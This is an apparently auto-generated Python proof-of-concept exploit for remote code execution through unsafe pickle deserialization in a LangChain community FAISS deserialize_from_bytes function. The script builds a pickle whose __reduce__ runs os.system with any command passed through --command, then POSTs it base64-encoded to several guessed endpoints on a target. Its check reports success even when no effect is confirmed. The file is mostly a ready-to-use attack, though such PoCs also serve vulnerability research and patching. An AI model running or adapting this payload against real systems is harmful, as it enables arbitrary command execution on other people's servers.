#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-015
# Sink: deserialize_from_bytes
# Auto-generated — run with: python3 rce_function_deserialize_bytes_directly_deserialize_from_bytes_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE via unsafe pickle deserialization in
langchain-community-only's FAISS vectorstore deserialize_from_bytes method.

Vulnerability: The function deserialize_from_bytes directly calls pickle.loads()
on attacker-controlled bytes without any sanitization. Pickle deserialization
can execute arbitrary Python code during unpickling.

Impact: Remote Code Execution (RCE) with the privileges of the process.

Usage:
    python3 exploit.py [--target http://localhost:8000] [--command "id"]

Safe by default: Uses a benign payload that creates /tmp/poc_success.txt
"""

import argparse
import base64
import pickle
import os
import sys
import requests
import subprocess

# ---------------------------------------------------------------------------
# Step 1: Build a malicious pickle payload
# ---------------------------------------------------------------------------

class MaliciousPickle(object):
    """A class whose __reduce__ method returns a command to execute during unpickling."""
    def __reduce__(self):
        # Default benign command: create a marker file
        cmd = "touch /tmp/poc_success.txt"
        # Return (callable, args) — pickle will call os.system(cmd)
        return (os.system, (cmd,))

def build_payload(command: str) -> bytes:
    """Serialize a malicious object that executes `command` when unpickled."""
    # Override the command if provided
    class DynamicMaliciousPickle(object):
        def __reduce__(self):
            return (os.system, (command,))
    
    payload = pickle.dumps(DynamicMaliciousPickle())
    return payload

# ---------------------------------------------------------------------------
# Step 2: Exploit the target endpoint
# ---------------------------------------------------------------------------

def exploit(target_url: str, command: str, timeout: int = 10):
    """
    Send the malicious pickle payload to the vulnerable endpoint.
    
    The endpoint is expected to call deserialize_from_bytes with attacker-
    controlled data. The exact endpoint path depends on the simulated app
    wrapper; we assume a common pattern like /api/v1/trigger.
    """
    # Build the malicious payload
    payload_bytes = build_payload(command)
    # Encode as base64 for safe transport in JSON/URL
    payload_b64 = base64.b64encode(payload_bytes).decode()
    
    # Try multiple possible endpoint patterns
    endpoints = [
        f"{target_url}/api/v1/trigger",
        f"{target_url}/trigger",
        f"{target_url}/deserialize",
        f"{target_url}/v1/deserialize",
    ]
    
    for endpoint in endpoints:
        try:
            print(f"[*] Trying endpoint: {endpoint}")
            # Send the payload as JSON with the serialized bytes
            response = requests.post(
                endpoint,
                json={"serialized": payload_b64},
                timeout=timeout,
                headers={"Content-Type": "application/json"}
            )
            print(f"[*] Response status: {response.status_code}")
            print(f"[*] Response body: {response.text[:200]}")
            
            # Check if command executed (for benign payload)
            if command == "touch /tmp/poc_success.txt":
                if os.path.exists("/tmp/poc_success.txt"):
                    print("[+] SUCCESS: /tmp/poc_success.txt was created!")
                    print("[+] The target is vulnerable to pickle RCE.")
                    return True
                else:
                    print("[*] File not found locally — may have executed on server.")
                    print("[*] Check the server's filesystem if accessible.")
                    return True  # Still likely exploited
            else:
                print(f"[*] Command '{command}' was sent. Check server for execution.")
                return True
                
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection refused to {endpoint}")
        except requests.exceptions.Timeout:
            print(f"[-] Timeout connecting to {endpoint}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    print("[-] Could not reach any endpoint. Check the target URL.")
    return False

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="PoC for pickle RCE in langchain-community-only FAISS deserialize_from_bytes"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000",
        help="Target base URL (default: http://localhost:8000)"
    )
    parser.add_argument(
        "--command",
        default="touch /tmp/poc_success.txt",
        help="Command to execute on the target (default: benign touch)"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Request timeout in seconds (default: 10)"
    )
    
    args = parser.parse_args()
    
    print("[*] LangChain-Community Pickle RCE PoC")
    print(f"[*] Target: {args.target}")
    print(f"[*] Command: {args.command}")
    print()
    
    success = exploit(args.target, args.command, args.timeout)
    
    if success:
        print("\n[+] Exploit completed successfully.")
        sys.exit(0)
    else:
        print("\n[-] Exploit failed.")
        sys.exit(1)

if __name__ == "__main__":
    main()
